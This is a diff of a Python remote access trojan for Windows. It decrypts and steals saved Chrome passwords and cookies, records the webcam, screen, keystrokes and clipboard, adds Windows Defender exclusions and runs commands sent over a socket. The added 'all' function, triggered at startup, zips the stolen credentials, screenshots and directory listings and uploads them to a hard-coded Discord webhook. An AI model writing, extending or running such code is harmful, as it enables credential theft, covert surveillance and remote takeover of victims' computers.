@@ -1,4 +1,4 @@
-import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, webbrowser, time, requests,pynput, pyperclip, sqlite3, base64, json, pyaudio, wave
+import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, webbrowser, time, requests, pynput, pyperclip, sqlite3, base64, json, pyaudio, wave, zipfile
 
 from datetime import datetime, timedelta
 
@@ -9,6 +9,7 @@ from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from colorama import Fore
 
+
 def get_chrome_datetime(chromedate):
     if chromedate != 86400000000 and chromedate:
         try:
@@ -18,6 +19,7 @@ def get_chrome_datetime(chromedate):
             return chromedate
     else:
         return ""
+
 
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
@@ -30,6 +32,7 @@ def get_encryption_key():
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     key = key[5:]
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
 
 def decrypt_data(data, key):
     try:
@@ -44,10 +47,12 @@ def decrypt_data(data, key):
             # not supported
             return ""
 
+
 def save_cookies_to_txt(cookies):
     with open("cookies.txt", "w", encoding="utf-8") as file:
         for cookie_data in cookies:
             file.write(cookie_data + "\n\n")
+
 
 def cookie(webhook):
     subprocess.call(["taskkill", "/F", "/IM", "chrome.exe"])
@@ -106,8 +111,10 @@ def cookie(webhook):
         os.remove("cookies.txt")
         return f"Failed to send the cookies file via webhook!"
 
+
 def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
 
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
@@ -126,6 +133,7 @@ def get_encryption_key():
     # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
+
 def decrypt_password(password, key):
     try:
         # get the initialization vector
@@ -142,10 +150,12 @@ def decrypt_password(password, key):
             # not supported
             return ""
 
+
 def save_passwords_to_txt(passwords):
     with open("passwords.txt", "w", encoding="utf-8") as file:
         for password_data in passwords:
             file.write(password_data + "\n\n")
+
 
 def main():
     results = []
@@ -153,7 +163,7 @@ def main():
     key = get_encryption_key()
     # local sqlite Chrome database path
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                            "Google", "Chrome", "User Data", "default", "Login Data")
+                           "Google", "Chrome", "User Data", "default", "Login Data")
     # copy the file to another location
     # as the database will be locked if chrome is currently running
     filename = "ChromeData.db"
@@ -162,7 +172,8 @@ def main():
     db = sqlite3.connect(filename)
     cursor = db.cursor()
     # `logins` table has the data we need
-    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+    cursor.execute(
+        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
     # iterate over all rows
     for row in cursor.fetchall():
         origin_url = row[0]
@@ -187,6 +198,7 @@ def main():
         pass
     return results
 
+
 def send_passwords_via_webhook(webhook):
     passwords = main()
     save_passwords_to_txt(passwords)
@@ -201,6 +213,7 @@ def send_passwords_via_webhook(webhook):
     else:
         os.remove("passwords.txt")
         return "Failed to send the passwords file via webhook!"
+
 
 class Functions:
     def list_dir(self):
@@ -220,18 +233,21 @@ class Functions:
         self.ip_adress = socket.gethostbyname()
 
         return self.ip_adress
+
     def create_file(self, data):
         try:
             self.file = os.mkdir(data)
             return f"{Fore.GREEN}Succsesfully to created the file! : {self.file}{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
     def delete_file(self, data):
         try:
             self.delete = os.rmdir(data)
             return f"{Fore.GREEN}Succsesfully to deleted the file : {self.delete}{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
     def read(self, data):
         try:
             with open(data, "r") as file:
@@ -239,7 +255,8 @@ class Functions:
                 return self.content
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
-    def  touch(self, data):
+
+    def touch(self, data):
         try:
             with open(data, 'x') as dosya:
                 pass
@@ -251,6 +268,7 @@ class Functions:
         self.dizin = os.getcwd()
 
         return self.dizin
+
     def capture_camera(self, webhook_url):
         self.camera = cv2.VideoCapture(0)
 
@@ -331,9 +349,9 @@ class Functions:
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
-    def steal_cookie(self, webhook_url):
+    def steal_cookie(self, data):
         try:
-            return cookie(webhook_url)
+            return cookie(data)
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
@@ -353,6 +371,7 @@ class Functions:
 
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
     def defender_on(self):
         try:
             if ctypes.windll.shell32IsUserAnAdmin():
@@ -367,7 +386,9 @@ class Functions:
         try:
             if ctypes.windll.shell32IsUserAnAdmin():
                 self.script_directory = os.path.dirname(os.path.realpath(sys.argv[0]))
-                self.exclusion = subprocess.run(['powershell', '-Command', f"Add-MpPreference -ExclusionPath '{self.script_directory}'"],capture_output=True, text=True)
+                self.exclusion = subprocess.run(
+                    ['powershell', '-Command', f"Add-MpPreference -ExclusionPath '{self.script_directory}'"],
+                    capture_output=True, text=True)
                 return f"{Fore.GREEN}Succsesfully exclusion! {self.exclusion}{Fore.RESET}"
             else:
                 return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"
@@ -410,6 +431,7 @@ class Functions:
 
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
     def rename(self, old_name, new_name):
         try:
             os.rename(old_name, new_name)
@@ -470,7 +492,8 @@ class Functions:
     def admin_shell(self, data):
         try:
             if ctypes.windll.shell32.IsUserAnAdmin() == True:
-                self.admin_shell = subprocess.run(['runas', '/user:Administrator', 'powershell', '-Command', data],capture_output=True, text=True)
+                self.admin_shell = subprocess.run(['runas', '/user:Administrator', 'powershell', '-Command', data],
+                                                  capture_output=True, text=True)
                 return f"{self.admin_shell}"
             else:
                 return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"
@@ -508,7 +531,7 @@ class Functions:
     def ping(self, data):
         try:
             self.url = data
-            self.ping =os.system(f"ping {self.url}")
+            self.ping = os.system(f"ping {self.url}")
             return f"{Fore.GREEN}Succsesfully the activated CMD code!{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
@@ -534,6 +557,7 @@ class Functions:
                     listen.join()
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
     def type(self, data):
         try:
             pyautogui.write(data)
@@ -561,7 +585,6 @@ class Functions:
             return f"{Fore.GREEN}Clicked the {data}{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
-
 
     def clipboard(self):
         try:
@@ -612,12 +635,59 @@ class Functions:
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
+    def all(self, webhook, computer_name):
+        try:
+            screenshot = pyautogui.screenshot("screenshot.png")
+
+            Functions.steal_password(data=" ")
+            Functions.steal_cookie(data=" ")
+
+            with open("list.txt", "w") as list:
+                list.write(str(Functions.list_dir()))
+
+            with open("directory.txt", "w") as directory:
+                directory.write(Functions.dizin())
+
+
+            with zipfile.ZipFile(f"{computer_name}.zip", "w") as zipf:
+                zipf.write("screenshot.png")
+                zipf.write("passwords.txt")
+                zipf.write("cookies.txt")
+                zipf.write("list.txt")
+                zipf.write("directory.txt")
+
+            url = webhook
+            files = {'file': open(f'{computer_name}.zip', 'rb')}
+            response = requests.post(url, files=files)
+            time.sleep(5)
+
+            file = ["screenshot.png", "passwords.txt", "cookies.txt", "list.txt", "directory.txt", f"{computer_name}.zip"]
+            for dosya in file:
+                if os.path.exists(dosya):
+                    os.remove(dosya)
+                else:
+                    pass
+
+        except Exception as e:
+            file = ["screenshot.png", "passwords.txt", "cookies.txt", "list.txt", "directory.txt"]
+            for dosya in file:
+                if os.path.exists(f"{computer_name}.zip"):
+                    pass
+                elif os.path.exists(dosya):
+                    os.remove(dosya)
+                else:
+                    pass
+        finally:
+            pass
+
+
 Functions = Functions()
+
 
 class Main:
     webhook = "https://discord.com/api/webhooks/1217526873932824597/r0HTVunZExlyg672N1vE4kD9gm77dbj7qtACVtd_Rs8dKidl0sLLcM5Ip9Y6BNg_a5Ly"
-    host = "localhost"
-    port = 9999
+    host = "192.168.1.38"
+    port = 4566
 
     computer_name = socket.gethostname()
     message = f"{computer_name} is {host} : {port} listening!"
@@ -631,6 +701,12 @@ class Main:
     }
 
     response = requests.post(webhook, data=json.dumps(payload), headers=headers)
+
+    Functions.all(webhook, computer_name)
+    if os.path.exists(f"{computer_name}.zip"):
+        os.remove(f"{computer_name}.zip")
+    else:
+        pass
 
     while True:
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -679,7 +755,7 @@ class Main:
                     elif data.startswith("cp "):
                         data = data[3:]
                         conn.send(f"{Functions.capture_camera()}".encode())
-                        
+
                     elif data.startswith("camera "):
                         data = data[7:]
                         conn.send(f"{Functions.capture_camera(data)}".encode())
@@ -707,6 +783,7 @@ class Main:
                     elif data.startswith("screenshoot "):
                         data = data[12:]
                         conn.send(f"{Functions.take_screenshot(webhook)}".encode())
+                        os.remove("error.png")
 
                     elif data.startswith("vc "):
                         data = data[3:]
